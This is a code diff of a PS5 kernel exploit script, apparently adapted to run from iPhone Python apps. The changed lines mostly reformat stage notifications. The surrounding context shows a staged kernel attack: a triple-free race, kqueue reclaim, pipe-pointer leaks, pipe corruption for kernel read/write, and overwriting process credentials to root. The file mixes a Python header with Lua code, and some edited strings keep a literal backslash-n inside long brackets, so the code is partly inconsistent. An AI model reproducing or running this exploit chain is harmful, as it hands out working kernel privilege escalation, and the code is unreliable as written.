@@ -1,5 +1,6 @@
 # Modified by MexrlDev to run on any iphone by using python apps
 
+# Huge thanks to Drake4530 for telling me the bugs i had and hoe to fix them :D
 # Code Ver: 1.3
 
 import socket
@@ -651,7 +652,8 @@ function poops_ps5()
     end
 
     -- Stage 0: Triple-free race
-    send_notification("Stage 0\nTriple-free race")
+    send_notification([[Stage 0
+Triple-free race]])
     local uaf_socket = -1
     local race_success = false
 
@@ -736,8 +738,8 @@ function poops_ps5()
     syscall.nanosleep(DELAY_MEDIUM, 0)
 
     -- Stage 1: Kqueue reclaim
-    send_notification("Stage 1\nKqueue reclaim")
-    
+send_notification([[Stage 1
+Kqueue reclaim]])
     free_rthdr(ipv6_sockets[triplets[2] + 1])
     syscall.sched_yield(); syscall.sched_yield()
 
@@ -786,7 +788,7 @@ function poops_ps5()
     if triplets[2] == -1 then error("[1] triplet repair failed"); return nil end
 
     -- Stage 2: Leak pipe data pointers
-    send_notification("Stage 2\nLeak pipe data pointers")
+    send_notification([[Stage 2\nLeak pipe data pointers]])
     ulog("[2] leaking pipe pointers...")
 
     local fd_ofiles
@@ -830,7 +832,7 @@ function poops_ps5()
     ulog("[2] master_pipe=" .. to_hex(master_pipe_data) .. " victim_pipe=" .. to_hex(victim_pipe_data))
 
     -- Stage 3: Pipe corruption -> fast kernel r/w
-    send_notification("Stage 3\nPipe corruption -> fast kernel r/w")
+    send_notification([[Stage 3\nPipe corruption -> fast kernel r/w]])
     ulog("[3] corrupting pipe buffer...")
 
     local pipe_overwrite = malloc(24)
@@ -971,7 +973,7 @@ function poops_ps5()
     sleep(3)
 
     -- Stage 4: Find curproc via ioctl FIOSETOWN + sigio
-    send_notification("Stage 4\nFind curproc via ioctl FIOSETOWN + sigio")
+    send_notification([[Stage 4\nFind curproc via ioctl FIOSETOWN + sigio]])
     local sigio_rfd, sigio_wfd = create_pipe_pair()
     local our_pid = syscall.getpid()
     local pid_buf = malloc(4); write32(pid_buf, our_pid)
@@ -1027,7 +1029,7 @@ function poops_ps5()
     ulog("[4] rootvnode=" .. to_hex(rootvnode))
 
     -- Stage 5: Jailbreak
-    send_notification("Stage 5\nJailbreak")
+    send_notification([[Stage 5\nJailbreak]])
     -- patch uid/gid to root
     kwrite32(proc_ucred + OFF.UCRED_CR_UID,     0)
     kwrite32(proc_ucred + OFF.UCRED_CR_RUID,    0)
@@ -1069,7 +1071,7 @@ function poops_ps5()
     _G.EBOOT_BASE = EBOOT_BASE
 
     -- Stage 6: GPU setup + debug patches
-    send_notification("Stage 6\nGPU setup + debug patches")
+    send_notification([[Stage 6\nGPU setup + debug patches]])
     local gpu_ok = gpu.setup()
     if gpu_ok then
         ulog("[6] gpu setup ok")
